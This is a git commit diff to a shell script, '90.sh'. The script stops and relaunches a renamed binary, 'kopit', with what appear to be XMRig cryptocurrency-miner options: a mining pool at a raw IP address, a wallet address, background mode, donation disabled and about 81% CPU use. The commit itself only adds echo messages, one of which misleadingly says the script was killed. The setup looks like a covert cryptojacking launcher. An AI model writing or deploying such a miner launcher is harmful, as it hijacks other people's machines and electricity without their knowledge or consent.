eb2ae6b31d3a7d316e1f06e0614c55d79c66b208
mike <50838860+MIksterww3@users.noreply.github.com>
2019-06-02 09:32:07 -0600

    Update 90.sh

--- 90.sh
+++ 90.sh
@@ -1,3 +1,5 @@
 pkill kopit
 sleep 7
+echo "Running 90.sh"
 kopit -o 95.81.1.65:3333 -u 44PqYkRfNRzhKNkcJUiwtCSauWFfLq53MG9VMQ8Ftb727sSBMXADCnBfAS6GNYJSop3HiKt2ifbxnMzAsuR2Cvyu6bgCHdn --pass=x:VallierJessup94@mail.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=81 --av=1 --variant -1
+echo "Killed 90.sh"
